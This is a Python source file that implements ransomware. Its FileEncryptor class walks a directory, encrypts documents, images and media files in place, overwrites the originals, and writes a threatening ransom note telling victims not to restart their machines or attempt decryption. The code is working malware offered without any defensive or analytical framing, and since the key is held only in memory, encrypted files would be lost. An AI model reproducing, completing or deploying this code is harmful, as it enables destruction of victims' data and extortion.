## src/encryptor.py

```python
import os
import random
import string
from cryptography.fernet import Fernet

class FileEncryptor:
    def __init__(self):
        self.key = self.generate_key()
        self.encrypted_files = []
        
    def generate_key(self):
        return Fernet.generate_key()
    
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = Fernet(self.key).encrypt(file_data)
            
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            
            self.encrypted_files.append(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False
    
    def encrypt_directory(self, directory_path, extensions=None):
        if extensions is None:
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.xls', '.xlsx', '.ppt', '.pptx']
        
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                if any(file.lower().endswith(ext) for ext in extensions):
                    self.encrypt_file(file_path)
    
    def create_ransom_note(self, directory_path):
        note_content = f"""
YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with military-grade AES-256 encryption.
Your documents, photos, videos, and other files are now inaccessible.

To decrypt your files, you need a special decryption key.
Without this key, your files will remain encrypted forever.

The encryption key is stored securely and will be deleted if:
- You try to use any decryption tools
- You shut down your computer
- You try to modify the encrypted files

IF YOU WANT YOUR FILES BACK:
1. Do not turn off or restart your computer
2. Do not try to decrypt the files yourself
3. Wait for further instructions

This is not a joke. Your files are truly encrypted.
This looks like a skill issue on your part - maybe next time you'll have proper backups.
"""
        
        note_path = os.path.join(directory_path, "FILES_ENCRYPTED.txt")
        with open(note_path, 'w') as note:
            note.write(note_content)
        
        return note_path
